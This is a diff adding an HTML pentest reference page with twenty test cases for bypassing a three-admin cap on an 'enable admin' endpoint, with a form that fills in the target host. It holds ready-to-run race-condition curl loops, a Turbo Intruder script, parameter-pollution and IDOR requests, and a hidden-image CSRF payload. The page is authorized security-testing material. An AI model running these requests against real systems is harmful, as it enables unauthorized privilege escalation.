@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Admin Panel - Max Admin Limit Bypass Test Cases</title>
+<style>
+  :root {
+    --bg: #0f1115;
+    --panel: #161922;
+    --panel-border: #262b38;
+    --text: #e4e7ee;
+    --muted: #8892a4;
+    --accent: #ff6b4a;
+    --accent2: #4ad0ff;
+    --code-bg: #0b0d12;
+    --ok: #4caf7d;
+    --warn: #e0b03e;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.6;
+  }
+  header {
+    padding: 40px 24px 28px;
+    border-bottom: 1px solid var(--panel-border);
+    background: linear-gradient(180deg, #1a1e29, var(--bg));
+  }
+  header h1 {
+    margin: 0 0 8px;
+    font-size: 26px;
+    letter-spacing: -0.02em;
+  }
+  header p {
+    margin: 0;
+    color: var(--muted);
+    max-width: 760px;
+    font-size: 14.5px;
+  }
+  .scope-note {
+    display: inline-block;
+    margin-top: 14px;
+    padding: 8px 14px;
+    background: rgba(224,176,62,0.1);
+    border: 1px solid rgba(224,176,62,0.35);
+    color: var(--warn);
+    border-radius: 6px;
+    font-size: 13px;
+  }
+  main {
+    max-width: 920px;
+    margin: 0 auto;
+    padding: 32px 24px 80px;
+  }
+  .toc {
+    background: var(--panel);
+    border: 1px solid var(--panel-border);
+    border-radius: 10px;
+    padding: 18px 22px;
+    margin-bottom: 32px;
+  }
+  .toc h2 { margin-top: 0; font-size: 15px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; }
+  .toc ol { margin: 0; padding-left: 20px; columns: 2; column-gap: 24px; }
+  .toc a { color: var(--accent2); text-decoration: none; font-size: 14px; }
+  .toc a:hover { text-decoration: underline; }
+
+  .case {
+    background: var(--panel);
+    border: 1px solid var(--panel-border);
+    border-radius: 10px;
+    padding: 22px 24px;
+    margin-bottom: 20px;
+    scroll-margin-top: 20px;
+  }
+  .case-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 6px;
+  }
+  .case-num {
+    background: var(--accent);
+    color: #1a1108;
+    font-weight: 700;
+    font-size: 13px;
+    padding: 3px 9px;
+    border-radius: 5px;
+  }
+  .case h3 { margin: 0; font-size: 17px; }
+  .case .goal { color: var(--muted); font-size: 14px; margin: 6px 0 14px; }
+  .tag {
+    display: inline-block;
+    font-size: 11px;
+    padding: 2px 8px;
+    border-radius: 20px;
+    margin-right: 6px;
+    margin-bottom: 10px;
+    font-weight: 600;
+    letter-spacing: 0.02em;
+  }
+  .tag.race { background: rgba(255,107,74,0.15); color: var(--accent); }
+  .tag.idor { background: rgba(74,208,255,0.15); color: var(--accent2); }
+  .tag.param { background: rgba(76,175,125,0.15); color: var(--ok); }
+  .tag.csrf { background: rgba(224,176,62,0.15); color: var(--warn); }
+  .tag.logic { background: rgba(160,120,255,0.15); color: #b19bff; }
+
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--panel-border);
+    border-radius: 8px;
+    padding: 14px 16px;
+    overflow-x: auto;
+    font-size: 13px;
+    margin: 10px 0;
+    position: relative;
+  }
+  code { font-family: "SF Mono", Menlo, Consolas, monospace; }
+  .expected {
+    margin-top: 10px;
+    font-size: 13.5px;
+    color: var(--muted);
+    border-left: 3px solid var(--panel-border);
+    padding-left: 12px;
+  }
+  .expected b { color: var(--text); }
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    background: var(--panel-border);
+    color: var(--muted);
+    border: none;
+    border-radius: 5px;
+    padding: 4px 9px;
+    font-size: 11px;
+    cursor: pointer;
+  }
+  .copy-btn:hover { background: #33394a; color: var(--text); }
+  .id-input-bar {
+    background: var(--panel);
+    border: 1px solid var(--panel-border);
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin-bottom: 28px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    align-items: center;
+  }
+  .id-input-bar label { font-size: 13px; color: var(--muted); }
+  .id-input-bar input {
+    background: var(--code-bg);
+    border: 1px solid var(--panel-border);
+    color: var(--text);
+    padding: 7px 10px;
+    border-radius: 6px;
+    font-size: 13px;
+    width: 90px;
+  }
+  .id-input-bar input#targetHost { width: 260px; }
+  .id-input-bar button {
+    background: var(--accent);
+    color: #1a1108;
+    border: none;
+    padding: 8px 14px;
+    border-radius: 6px;
+    font-weight: 600;
+    font-size: 13px;
+    cursor: pointer;
+  }
+  footer {
+    text-align: center;
+    color: var(--muted);
+    font-size: 12.5px;
+    padding: 30px 0;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Max-Admin-Limit Bypass — Test Case Reference</h1>
+  <p>Checklist of test cases for a GET-based "enable admin" endpoint that is supposed to cap active admins at 3. Covers race conditions, IDOR, parameter pollution, HTTP verb confusion, and CSRF exposure.</p>
+  <span class="scope-note">⚠ For use only against systems you are explicitly authorized to test. Replace placeholders and confirm scope before running.</span>
+</header>
+
+<main>
+
+  <div class="id-input-bar">
+    <label>Host:</label>
+    <input id="targetHost" value="https://target" />
+    <label>Endpoint path:</label>
+    <input id="targetPath" value="/api/admin/enable" style="width:220px" />
+    <label>Test user_id:</label>
+    <input id="testId" value="4" />
+    <button onclick="regen()">Regenerate commands below</button>
+  </div>
+
+  <div class="toc">
+    <h2>Test Cases</h2>
+    <ol>
+      <li><a href="#c1">Baseline limit check</a></li>
+      <li><a href="#c2">Basic race condition (parallel curl)</a></li>
+      <li><a href="#c3">Race condition — Turbo Intruder</a></li>
+      <li><a href="#c4">Race condition — hey / load tool</a></li>
+      <li><a href="#c5">Duplicate query parameter</a></li>
+      <li><a href="#c6">Array-style parameter</a></li>
+      <li><a href="#c7">Comma-separated IDs</a></li>
+      <li><a href="#c8">URL-encoded ID value</a></li>
+      <li><a href="#c9">Parameter case variation</a></li>
+      <li><a href="#c10">Path case variation</a></li>
+      <li><a href="#c11">HTTP verb confusion</a></li>
+      <li><a href="#c12">Direct IDOR on user object</a></li>
+      <li><a href="#c13">Toggle abuse (disable+enable combo)</a></li>
+      <li><a href="#c14">Client-side-only validation check</a></li>
+      <li><a href="#c15">CSRF exploitability (GET side effect)</a></li>
+      <li><a href="#c16">Response caching / prefetch replay</a></li>
+      <li><a href="#c17">Cross-session simultaneous promotion</a></li>
+      <li><a href="#c18">Negative / non-numeric / boundary IDs</a></li>
+      <li><a href="#c19">Trailing slash / extension trick</a></li>
+      <li><a href="#c20">Referrer-based / Burp Repeater group send</a></li>
+    </ol>
+  </div>
+
+  <div class="case" id="c1">
+    <div class="case-header"><span class="case-num">01</span><h3>Baseline — confirm the limit is enforced</h3></div>
+    <span class="tag logic">LOGIC</span>
+    <p class="goal">Establish ground truth before trying to break it.</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}{PATH}?user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> 4th admin request rejected with an error/limit message; admin count stays at 3.</div>
+  </div>
+
+  <div class="case" id="c2">
+    <div class="case-header"><span class="case-num">02</span><h3>Basic race condition — parallel curl</h3></div>
+    <span class="tag race">RACE</span>
+    <p class="goal">Fire several enable requests near-simultaneously to see if the count check has a TOCTOU gap.</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="for i in 4 5 6; do
+  curl -s '{HOST}{PATH}?user_id='$i -H 'Cookie: session=&lt;your_session&gt;' &amp;
+done
+wait"></code></pre>
+    <div class="expected"><b>Expected (if vulnerable):</b> more than 3 admins end up active because each request read the same pre-update count.</div>
+  </div>
+
+  <div class="case" id="c3">
+    <div class="case-header"><span class="case-num">03</span><h3>Race condition — Turbo Intruder (single-packet attack)</h3></div>
+    <span class="tag race">RACE</span>
+    <p class="goal">More reliable than curl — sends all requests in one TCP burst, minimizing jitter.</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code>def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=10,
+                            engine=Engine.THREADED)
+    for i in range(4, 8):
+        engine.queue(target.req, str(i), gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    table.add(req)</code></pre>
+    <p class="goal">Request template (paste in Turbo Intruder's request box, use <code>%s</code> as the marker):</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="GET {PATH}?user_id=%s HTTP/1.1
+Host: {HOSTNAME}
+Cookie: session=&lt;your_session&gt;
+Connection: keep-alive
+"></code></pre>
+    <div class="expected"><b>Expected (if vulnerable):</b> multiple 200/success responses for IDs 4-7 in the results table.</div>
+  </div>
+
+  <div class="case" id="c4">
+    <div class="case-header"><span class="case-num">04</span><h3>Race condition — hey / load tool</h3></div>
+    <span class="tag race">RACE</span>
+    <p class="goal">Quick concurrency hammer without Burp.</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="hey -n 10 -c 10 -H 'Cookie: session=&lt;your_session&gt;' '{HOST}{PATH}?user_id={ID}'"></code></pre>
+    <div class="expected"><b>Expected:</b> check final admin count after burst; inconsistent per-run results is a strong race-condition signal.</div>
+  </div>
+
+  <div class="case" id="c5">
+    <div class="case-header"><span class="case-num">05</span><h3>Duplicate query parameter</h3></div>
+    <span class="tag param">PARAM POLLUTION</span>
+    <p class="goal">Some frameworks validate the first occurrence but process the last (or vice versa).</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}{PATH}?user_id=3&amp;user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> server enables id={ID} despite validating against the already-legitimate id=3.</div>
+  </div>
+
+  <div class="case" id="c6">
+    <div class="case-header"><span class="case-num">06</span><h3>Array-style parameter</h3></div>
+    <span class="tag param">PARAM POLLUTION</span>
+    <p class="goal">Test if the endpoint (or an underlying framework default) accepts array syntax and bulk-processes it.</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}{PATH}?user_id[]={ID}&amp;user_id[]=5' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> both IDs get enabled in one request, only counted once by the limit check.</div>
+  </div>
+
+  <div class="case" id="c7">
+    <div class="case-header"><span class="case-num">07</span><h3>Comma-separated IDs</h3></div>
+    <span class="tag param">PARAM POLLUTION</span>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}{PATH}?user_id={ID},5,6' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> backend splits on comma and loops without re-checking count per item.</div>
+  </div>
+
+  <div class="case" id="c8">
+    <div class="case-header"><span class="case-num">08</span><h3>URL-encoded ID value</h3></div>
+    <span class="tag param">PARAM POLLUTION</span>
+    <p class="goal">Check if WAF/validation regex is bypassed by encoding while the app-layer parser still decodes correctly.</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}{PATH}?user_id=%34' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> identical behavior to plain "4" — flags any front-end filter that doesn't decode before checking.</div>
+  </div>
+
+  <div class="case" id="c9">
+    <div class="case-header"><span class="case-num">09</span><h3>Parameter name case variation</h3></div>
+    <span class="tag param">PARAM POLLUTION</span>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}{PATH}?User_Id={ID}' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> case-insensitive frameworks still process it while a case-sensitive validation layer misses it.</div>
+  </div>
+
+  <div class="case" id="c10">
+    <div class="case-header"><span class="case-num">10</span><h3>Path case variation</h3></div>
+    <span class="tag logic">LOGIC</span>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}/API/ADMIN/ENABLE?user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> routing layer normalizes case but a separate access-control middleware doesn't match the route, skipping the check.</div>
+  </div>
+
+  <div class="case" id="c11">
+    <div class="case-header"><span class="case-num">11</span><h3>HTTP verb confusion</h3></div>
+    <span class="tag logic">LOGIC</span>
+    <p class="goal">The limit check might be bound to GET specifically.</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s -X POST '{HOST}{PATH}?user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;'
+curl -s -X PUT '{HOST}{PATH}?user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;'
+curl -s -X PATCH '{HOST}{PATH}?user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> one of the alternate verbs succeeds where GET is blocked (or reveals an entirely separate code path).</div>
+  </div>
+
+  <div class="case" id="c12">
+    <div class="case-header"><span class="case-num">12</span><h3>Direct IDOR — edit user object instead of using the enable endpoint</h3></div>
+    <span class="tag idor">IDOR</span>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}/api/users/{ID}?is_admin=true' -H 'Cookie: session=&lt;your_session&gt;'
+curl -s -X PUT '{HOST}/api/users/{ID}' -d '{\"role\":\"admin\"}' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> the count/limit logic lives only in the dedicated "/enable" endpoint and is absent from the generic user-update endpoint.</div>
+  </div>
+
+  <div class="case" id="c13">
+    <div class="case-header"><span class="case-num">13</span><h3>Toggle abuse — disable one, enable two in close sequence</h3></div>
+    <span class="tag race">RACE</span>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}/api/admin/disable?user_id=3' -H 'Cookie: session=&lt;your_session&gt;' &amp;
+curl -s '{HOST}{PATH}?user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;' &amp;
+curl -s '{HOST}{PATH}?user_id=5' -H 'Cookie: session=&lt;your_session&gt;' &amp;
+wait"></code></pre>
+    <div class="expected"><b>Expected:</b> count check reads stale state mid-transition, letting both new admins through before the disable commits.</div>
+  </div>
+
+  <div class="case" id="c14">
+    <div class="case-header"><span class="case-num">14</span><h3>Client-side-only validation check</h3></div>
+    <span class="tag logic">LOGIC</span>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}/static/app.js' | grep -i 'admin.*limit\|max.*admin\|3'"></code></pre>
+    <div class="expected"><b>Expected:</b> if the "max 3" logic is only referenced in JS (e.g. disabling a button), replaying the raw request bypasses it entirely.</div>
+  </div>
+
+  <div class="case" id="c15">
+    <div class="case-header"><span class="case-num">15</span><h3>CSRF exploitability — GET request with a side effect</h3></div>
+    <span class="tag csrf">CSRF</span>
+    <p class="goal">Since state changes via GET with no visible token, test if a third-party page can trigger it silently.</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="&lt;img src=&quot;{HOST}{PATH}?user_id={ID}&quot; style=&quot;display:none&quot;&gt;"></code></pre>
+    <div class="expected"><b>Expected:</b> loading this from an attacker-controlled page while an admin session is active silently promotes user {ID} — flag regardless of the limit-bypass outcome.</div>
+  </div>
+
+  <div class="case" id="c16">
+    <div class="case-header"><span class="case-num">16</span><h3>Response caching / link-prefetch replay</h3></div>
+    <span class="tag logic">LOGIC</span>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -sI '{HOST}{PATH}?user_id={ID}' | grep -i cache"></code></pre>
+    <div class="expected"><b>Expected:</b> absence of no-store/no-cache headers means a browser prefetch, proxy cache, or shared link could unintentionally replay the state-changing GET.</div>
+  </div>
+
+  <div class="case" id="c17">
+    <div class="case-header"><span class="case-num">17</span><h3>Cross-session simultaneous promotion</h3></div>
+    <span class="tag race">RACE</span>
+    <p class="goal">Two different authenticated admin sessions each try to promote a different 4th admin at the same instant — tests whether the count check is enforced at the DB layer (locked) or app layer (racy).</p>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}{PATH}?user_id={ID}' -H 'Cookie: session=&lt;session_A&gt;' &amp;
+curl -s '{HOST}{PATH}?user_id=5' -H 'Cookie: session=&lt;session_B&gt;' &amp;
+wait"></code></pre>
+    <div class="expected"><b>Expected:</b> both succeed, resulting in 5 active admins — indicates missing DB-level unique constraint/lock, not just app-layer race.</div>
+  </div>
+
+  <div class="case" id="c18">
+    <div class="case-header"><span class="case-num">18</span><h3>Negative / non-numeric / boundary ID values</h3></div>
+    <span class="tag logic">LOGIC</span>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}{PATH}?user_id=-1' -H 'Cookie: session=&lt;your_session&gt;'
+curl -s '{HOST}{PATH}?user_id=0' -H 'Cookie: session=&lt;your_session&gt;'
+curl -s '{HOST}{PATH}?user_id=99999999999999' -H 'Cookie: session=&lt;your_session&gt;'
+curl -s '{HOST}{PATH}?user_id=4e0' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> unexpected input types cause the count-check logic to throw/skip while the enable logic downstream still executes (fail-open behavior).</div>
+  </div>
+
+  <div class="case" id="c19">
+    <div class="case-header"><span class="case-num">19</span><h3>Trailing slash / fake extension trick</h3></div>
+    <span class="tag logic">LOGIC</span>
+    <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code class="gen" data-tmpl="curl -s '{HOST}{PATH}/?user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;'
+curl -s '{HOST}{PATH}.json?user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;'
+curl -s '{HOST}{PATH}%20?user_id={ID}' -H 'Cookie: session=&lt;your_session&gt;'"></code></pre>
+    <div class="expected"><b>Expected:</b> reverse proxy / route-matching rule for the "protected" path doesn't match the modified path, so it falls through to the handler without middleware checks.</div>
+  </div>
+
+  <div class="case" id="c20">
+    <div class="case-header"><span class="case-num">20</span><h3>Burp Repeater — grouped "Send group in parallel"</h3></div>
+    <span class="tag race">RACE</span>
+    <p class="goal">Manual UI-based alternative to Turbo Intruder for the same race window test.</p>
+    <div class="expected">
+      1. Capture the GET enable request in Burp Proxy.<br>
+      2. Send to Repeater, duplicate the tab 3-4 times, edit each user_id.<br>
+      3. Select all tabs → right-click → <b>"Send group in parallel"</b> (single-packet mode if available).<br>
+      4. Compare response codes/bodies and check final admin count.
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  Internal test reference — replace placeholders, confirm written authorization/scope before executing. Document results (timestamps, response bodies, before/after counts) for the pentest report.
+</footer>
+
+<script>
+function regen() {
+  const host = document.getElementById('targetHost').value.trim() || 'https://target';
+  const path = document.getElementById('targetPath').value.trim() || '/api/admin/enable';
+  const id = document.getElementById('testId').value.trim() || '4';
+  let hostname;
+  try { hostname = new URL(host).host; } catch(e) { hostname = host.replace(/^https?:\/\//,''); }
+
+  document.querySelectorAll('.gen').forEach(el => {
+    let tmpl = el.getAttribute('data-tmpl');
+    tmpl = tmpl.replaceAll('{HOST}', host).replaceAll('{PATH}', path).replaceAll('{ID}', id).replaceAll('{HOSTNAME}', hostname);
+    el.textContent = tmpl;
+  });
+}
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(() => {
+    const old = btn.textContent;
+    btn.textContent = 'copied!';
+    setTimeout(() => btn.textContent = old, 1200);
+  });
+}
+regen();
+</script>
+
+</body>
+</html>
